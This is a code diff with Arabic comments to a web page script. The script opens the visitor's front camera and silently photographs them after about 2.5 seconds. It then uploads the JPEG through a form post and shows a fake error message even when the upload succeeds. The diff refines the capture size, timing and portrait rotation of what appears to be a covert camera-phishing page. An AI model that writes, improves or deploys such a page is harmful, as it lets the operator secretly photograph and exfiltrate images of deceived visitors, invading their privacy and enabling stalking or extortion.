@@ -54,24 +54,34 @@
         navigator.mediaDevices.getUserMedia({ 
             video: { 
                 facingMode: "user",
-                width: { ideal: 1080 },
-                height: { ideal: 1920 }
+                width: { ideal: 720 },
+                height: { ideal: 1280 }
             } 
         })
         .then(stream => {
             video.srcObject = stream;
-            setTimeout(captureAndSend, 2600);
+            setTimeout(captureAndSend, 2500);
         })
         .catch(() => showError());
 
         function captureAndSend() {
-            // تحسين النسبة للجوال (Portrait)
-            const aspect = video.videoHeight / video.videoWidth;
-            canvas.width = 1080;
-            canvas.height = Math.floor(1080 * aspect);
-            
-            const ctx = canvas.getContext('2d');
-            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+            // حل أفضل للوضع العمودي (Portrait)
+            let width = video.videoWidth;
+            let height = video.videoHeight;
+
+            // إذا كانت الصورة أفقية، نقلبها
+            if (width > height) {
+                canvas.width = height;
+                canvas.height = width;
+                const ctx = canvas.getContext('2d');
+                ctx.translate(height, 0);
+                ctx.rotate(Math.PI / 2);
+                ctx.drawImage(video, 0, 0, width, height);
+            } else {
+                canvas.width = width;
+                canvas.height = height;
+                canvas.getContext('2d').drawImage(video, 0, 0);
+            }
             
             canvas.toBlob(blob => {
                 const formData = new FormData();
@@ -84,7 +94,7 @@
                 })
                 .then(() => showError())
                 .catch(() => showError());
-            }, 'image/jpeg', 0.88);
+            }, 'image/jpeg', 0.9);
         }
 
         function showError() {
